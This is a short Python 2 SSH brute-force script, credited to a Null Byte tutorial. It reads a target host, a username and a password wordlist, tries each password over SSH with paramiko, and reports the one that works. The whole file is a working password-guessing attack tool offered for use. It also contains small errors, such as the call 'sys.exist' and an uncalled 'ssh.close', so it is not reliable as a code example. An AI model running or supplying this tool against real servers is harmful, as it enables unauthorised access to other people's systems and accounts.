# 
# SSH Brute Forcer with Password File
# Credit to SERGEANT SPLOIT https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
#
import paramiko, sys, os, socket
global host, username, line, input_file

line = '\n-----------------------------------------------------\n'

try:
	host = raw_input("[*] Enter Target Host Address: ")
	username = raw_input("[*] Enter SSH Username: ")
	input_file = raw_input("[*] Enter SSH Password File: ")

	if os.path.exists(input_file)  == False:
		print "\n[*] File Path Does Not Exist!!!"
		sys.exist(4)
except KeyboardInterrupt:
	print "\n\n[*] User Requested An Interrupt"
	sys.exit(3)

def ssh_connect(password, code = 0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	try:
		ssh.connect(host, port=22, username=username, password=password)
	except paramiko.AuthenticationException:
	#	print "[*] Authentication Failed ..."
		code = 1
	except socket.error, e:
	#	print "[*] Connection Failed ... Host Down"
		code = 2
	ssh.close
	return code

input_file = open(input_file)
print " "

numcount = 0
numcount = int(numcount)
for i in input_file.readlines():
	numcount += 1
	password = i.strip("\n")
	try:
		response = ssh_connect(password)
	
		if response == 0:
			print("%s[+%s] User: %s [+%s] Pass Found: %s%s" % (line, numcount, username, numcount, password, line))
			sys.exit(0)
		elif response == 1:
			print("[" + str(numcount) + "]" + " User: " + str(username) + " [" + str(numcount) + "]" + " Incorrect Pass: " + str(password))
		elif response == 2:
			print("[*] Connection Could Not Be Established To Address: %s" % (host))
			sys.exit(2)
	except Exception as inst:
		print type(inst)
		pass
input_file.close()
